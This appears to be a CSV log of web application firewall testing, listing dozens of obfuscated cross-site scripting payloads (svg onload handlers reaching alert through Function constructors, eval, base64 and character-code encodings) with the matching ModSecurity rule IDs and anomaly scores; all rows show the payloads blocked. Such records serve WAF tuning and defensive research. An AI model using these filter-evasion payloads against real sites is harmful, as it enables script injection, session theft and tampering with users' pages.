1952,"<svg onload=""((new Function('al'+'\145'+'r'+'t(1)'))())""></svg>",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o46,9v217,63t:urlDecode,t:replaceComments,t:compressWhitespace || o15,13v217,63 || o15,13v217,63t:urlDecodeUni || v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603506724.036989
1953,"<svg onload=""((new Function('al'+'e'+'r'+'t'+'(1)'))())""></svg>",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o13,42v217,63t:urlDecode,t:replaceComments,t:compressWhitespace || o15,13v217,63 || o15,13v217,63t:urlDecodeUni || v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603506873.558516
1954,"<svg onload=""((new Function(['al','ert(1)'].join('')))())""></svg>",0,1,block,6,"933210,934100,941100,941120,941160,949110","o38,19v217,65t:urlDecode,t:replaceComments,t:compressWhitespace || o15,13v217,65 || v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603506979.522884
1955,"<svg onload=""((new Function(String.fromCharCode(97,108,101,114,116,40,49,41)))())""></svg>",0,1,block,5,"934100,941100,941120,941160,949110","o15,13v217,89 || v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603507030.676495
1956,"<svg onload=""((new Function('al'['\x63oncat']('ert','(1)')))())""></svg>",0,1,block,6,"933210,934100,941100,941120,941160,949110","o53,10v217,71t:urlDecode,t:replaceComments,t:compressWhitespace || o15,13v217,71 || v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603507127.934667
1957,"<svg onload=""((new Function(`${'al'}${'ert'}${String.fromCharCode(40)}1${String.fromCharCode(41)}`))())""></svg>",0,1,block,6,"932130,934100,941100,941120,941160,949110","o28,64v217,111t:urlDecodeUni,t:cmdLine || o15,13v217,111 || v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603507284.794014
1958,"<svg onload=""((new Function('al'.concat('ert(1)')))())""></svg>",0,1,block,6,"933210,934100,941100,941120,941160,949110","o13,41v217,62t:urlDecode,t:replaceComments,t:compressWhitespace || o15,13v217,62 || v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603507420.835451
1960,"<svg onload=""((new Function('al'+'e'+'r'+'t'+String.fromCharCode(40,49,41)))())""></svg>",0,1,block,6,"934100,934100,941100,941120,941160,949110","o15,13v217,87 || o15,13v217,87t:urlDecodeUni || v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603507682.767280
1961,"<svg onload=""((new Function(atob('YWxlcnQoMSk')))())""></svg>",0,1,block,6,"933210,934100,941100,941120,941160,949110","o13,39v217,60t:urlDecode,t:replaceComments,t:compressWhitespace || o15,13v217,60 || v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603507795.354081
1962,"<svg onload=""((new Function('al'['\u0063oncat']('ert(1)')))())""></svg>",0,1,block,6,"933210,934100,941100,941120,941160,949110","o47,15v217,70t:urlDecode,t:replaceComments,t:compressWhitespace || o15,13v217,70 || v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603507890.832018
1963,"<svg onload=""((new Function('\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029'))())""></svg>",0,1,block,5,"934100,941100,941120,941160,949110","o15,13v217,91 || v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603507990.894723
1965,"<svg onload=""((new Function('\141\154\145\162\164\050\061\051'))())""></svg>",0,1,block,5,"934100,941100,941120,941160,949110","o15,13v217,75 || v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603508289.527702
1967,"<svg onload=""((new Function('retur'+'n aler'+'t'))())(1)"">",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o13,43v217,58t:urlDecode,t:replaceComments,t:compressWhitespace || o15,13v217,58 || o15,13v217,58t:urlDecodeUni || v217,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603508421.289510
1968,"<svg onload=""((new Function(String.fromCharCode(114,101,116,117,114,110,32,97,108,101,114,116)))())(1)"">",0,1,block,6,"933210,934100,941100,941120,941160,949110","o96,6v217,104t:urlDecode,t:replaceComments,t:compressWhitespace || o15,13v217,104 || v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603508532.821819
1972,"<svg onload=""((Function['constru'+'ctor']('return aler'+'t'))())(1)"">",0,1,block,5,"933210,941100,941120,941160,949110","o13,54v217,69t:urlDecode,t:replaceComments,t:compressWhitespace || v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603509051.736500
1975,"<svg onload=""((new Function(atob('cmV0dXJuIGFsZXJ0')))())(1)"">",0,1,block,6,"933210,934100,941100,941120,941160,949110","o13,47v217,62t:urlDecode,t:replaceComments,t:compressWhitespace || o15,13v217,62 || v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603509428.828036
1977,"<svg onload=""((new Function(['ret','urn ','ale','rt'].join('')))())(1)"">",0,1,block,6,"933210,934100,941100,941120,941160,949110","o58,12v217,72t:urlDecode,t:replaceComments,t:compressWhitespace || o15,13v217,72 || v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603509676.434736
1985,"<svg onload=""((new Function(String['fromCh'+'arCode'](114,101,116,117,114,110,32,97,108,101,114,116)))())(1)"">",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o13,95v217,110t:urlDecode,t:replaceComments,t:compressWhitespace || o15,13v217,110 || o15,13v217,110t:urlDecodeUni || v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603510542.355294
1987,"<svg onload=""(function x(){return top['Function']('ale'+'rt(1)')}())()""></svg>",0,1,block,6,"933210,941100,941120,941160,941370,949110","o13,57v217,78t:urlDecode,t:replaceComments,t:compressWhitespace || v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o34,15v217,78t:urlDecodeUni,t:compressWhitespace || ",25,177603510824.734912
1988,"<svg onload=""(function x(){return [].constructor.constructor('ale'+'rt(1)')}())()""></svg>",0,1,block,5,"933210,941100,941120,941160,949110","o13,68v217,89t:urlDecode,t:replaceComments,t:compressWhitespace || v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603510922.278893
1991,"<svg onload=""(function x(){return self['Function']('al'+'ert'+String.fromCharCode(40,49,41))}())()""></svg>",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o13,85v217,106t:urlDecode,t:replaceComments,t:compressWhitespace || o62,19v217,106 || o62,19v217,106t:urlDecodeUni || v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o34,16v217,106t:urlDecodeUni,t:compressWhitespace || ",35,177603511255.145304
1992,"<svg onload=""(function x(){return globalThis['Function']('ale'+'rt(1)')}())()""></svg>",0,1,block,5,"933210,941100,941120,941160,949110","o13,64v217,85t:urlDecode,t:replaceComments,t:compressWhitespace || v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603511313.957282
1993,"<svg onload=""(function x(){return parent['\u0046unction']('ale'+'rt(1)')}())()""></svg>",0,1,block,5,"933210,941100,941120,941160,949110","o57,21v217,86t:urlDecode,t:replaceComments,t:compressWhitespace || v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603511566.752282
1994,"<svg onload=""(function x(){return (0,eval)('ale'+'rt(1)')}())()""></svg>",0,1,block,5,"933210,941100,941120,941160,949110","o42,21v217,71t:urlDecode,t:replaceComments,t:compressWhitespace || v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603511644.575406
1995,"<svg onload=""(function x(){return window['eval']('ale'+'rt(1)')}())()""></svg>",0,1,block,6,"933210,941100,941120,941160,941370,949110","o13,56v217,77t:urlDecode,t:replaceComments,t:compressWhitespace || v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o34,14v217,77t:urlDecodeUni,t:compressWhitespace || ",25,177603511795.312003
1996,"<svg onload=""(function x(){return ''['constructor']['constructor']('ale'+'rt(1)')}())()""></svg>",0,1,block,5,"933210,941100,941120,941160,949110","o13,74v217,95t:urlDecode,t:replaceComments,t:compressWhitespace || v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603511857.357226
1997,"<svg onload=""(function x(){return (function(){}).constructor('ale'+'rt(1)')}())()""></svg>",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o13,68v217,89t:urlDecode,t:replaceComments,t:compressWhitespace || o35,11v217,89 || o35,11v217,89t:urlDecodeUni || v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603511948.799290
1998,"<svg onload=""(function x(){return []['find']['constructor']('ale'+'rt(1)')}())()""></svg>",0,1,block,5,"933210,941100,941120,941160,949110","o13,67v217,88t:urlDecode,t:replaceComments,t:compressWhitespace || v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603512053.589818
1999,"<svg onload=""(function x(){return []['filter']['constructor']('ale'+'rt(1)')}())()""></svg>",0,1,block,5,"933210,941100,941120,941160,949110","o13,69v217,90t:urlDecode,t:replaceComments,t:compressWhitespace || v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603512140.911134
2000,"<svg onload=""(function x(){return top[String.fromCharCode(70,117,110,99,116,105,111,110)]('ale'+'rt(1)')}())()""></svg>",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o89,21v217,118t:urlDecode,t:replaceComments,t:compressWhitespace || o38,19v217,118 || o38,19v217,118t:urlDecodeUni || v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o34,55v217,118t:urlDecodeUni,t:compressWhitespace || ",35,177603512210.306324
2001,"<svg onload=""(function x(){return window['Function']['call'](null,'ale'+'rt(1)')}())()""></svg>",0,1,block,6,"933210,941100,941120,941160,941370,949110","o13,73v217,94t:urlDecode,t:replaceComments,t:compressWhitespace || v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o34,18v217,94t:urlDecodeUni,t:compressWhitespace || ",25,177603512488.824464
2002,"<svg onload=""(function x(){return setTimeout['constructor']('ale'+'rt(1)')}())()""></svg>",0,1,block,5,"933210,941100,941120,941160,949110","o13,67v217,88t:urlDecode,t:replaceComments,t:compressWhitespace || v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603512513.636234
2003,"<svg onload=""(function x(){return (async()=>{})['constructor']('ale'+'rt(1)')}())()""></svg>",0,1,block,5,"933210,941100,941120,941160,949110","o47,36v217,91t:urlDecode,t:replaceComments,t:compressWhitespace || v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603512655.620156
2005,"<svg onload=""(function x(){return RegExp['constructor']['constructor']('ale'+'rt(1)')}())()""></svg>",0,1,block,5,"933210,941100,941120,941160,949110","o13,78v217,99t:urlDecode,t:replaceComments,t:compressWhitespace || v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,17760351281.135463
2006,"<svg onload=""(function x(){return Error['constructor']['constructor']('ale'+'rt(1)')}())()""></svg>",0,1,block,5,"933210,941100,941120,941160,949110","o13,77v217,98t:urlDecode,t:replaceComments,t:compressWhitespace || v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603513011.196110
2007,"<svg onload=""(function(){const f=top['\x61lert'];f(String.fromCharCode(88,83,83))})()""></svg>",0,1,block,6,"934100,941100,941120,941160,941370,949110","o14,11v217,93 || v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o33,15v217,93t:urlDecodeUni,t:compressWhitespace || ",25,177603513120.536517
2008,"<svg onload=""(function(){const f=parent['\x61lert'];f(String.fromCharCode(88,83,83))})()""></svg>",0,1,block,5,"934100,941100,941120,941160,949110","o14,11v217,96 || v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603513228.739907
2009,"<svg onload=""(function(){const f=self['\x61lert'];f(String.fromCharCode(88,83,83))})()""></svg>",0,1,block,6,"934100,941100,941120,941160,941370,949110","o14,11v217,94 || v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o33,16v217,94t:urlDecodeUni,t:compressWhitespace || ",25,177603513398.673893
2010,"<svg onload=""(function(){const f=globalThis['\x61lert'];f(String.fromCharCode(88,83,83))})()""></svg>",0,1,block,5,"934100,941100,941120,941160,949110","o14,11v217,100 || v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603513484.472472
2012,"<svg onload=""(function(){const g=window;const f=g['\x61lert'];f(String.fromCharCode(88,83,83))})()""></svg>",0,1,block,5,"934100,941100,941120,941160,949110","o14,11v217,106 || v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603513785.785895
2014,"<svg onload=""(function(){window['\x61lert'](String.fromCharCode(88,83,83))})()""></svg>",0,1,block,6,"934100,941100,941120,941160,941370,949110","o14,11v217,86 || v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,18v217,86t:urlDecodeUni,t:compressWhitespace || ",25,177603513989.072747
2016,"<svg onload=""(function(){const f=window[atob('YWxlcnQ')];f(String.fromCharCode(88,83,83))})()""></svg>",0,1,block,6,"934100,941100,941120,941160,941370,949110","o14,11v217,101 || v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o33,23v217,101t:urlDecodeUni,t:compressWhitespace || ",25,177603514255.733857
2017,"<svg onload=""(function(){const f=window['al'+'ert'];f(String.fromCharCode(88,83,83))})()""></svg>",0,1,block,7,"934100,934100,941100,941120,941160,941370,949110","o14,11v217,96 || o14,11v217,96t:urlDecodeUni || v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o33,18v217,96t:urlDecodeUni,t:compressWhitespace || ",30,177603514323.477256
2018,"<svg onload=""(function(){const f=window['\u0061\u006c\u0065\u0072\u0074'];f(String.fromCharCode(88,83,83))})()""></svg>",0,1,block,6,"934100,941100,941120,941160,941370,949110","o14,11v217,118 || v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o33,40v217,118t:urlDecodeUni,t:compressWhitespace || ",25,177603514495.063892
2019,"<svg onload=""(function(){const f=window['a\u006cert'];f(String.fromCharCode(88,83,83))})()""></svg>",0,1,block,6,"934100,941100,941120,941160,941370,949110","o14,11v217,98 || v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o33,20v217,98t:urlDecodeUni,t:compressWhitespace || ",25,177603514653.656685
2020,"<svg onload=""(function(){const f=window['\141\154\145\162\164'];f(String.fromCharCode(88,83,83))})()""></svg>",0,1,block,6,"934100,941100,941120,941160,941370,949110","o14,11v217,108 || v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o33,30v217,108t:urlDecodeUni,t:compressWhitespace || ",25,177603514720.783402
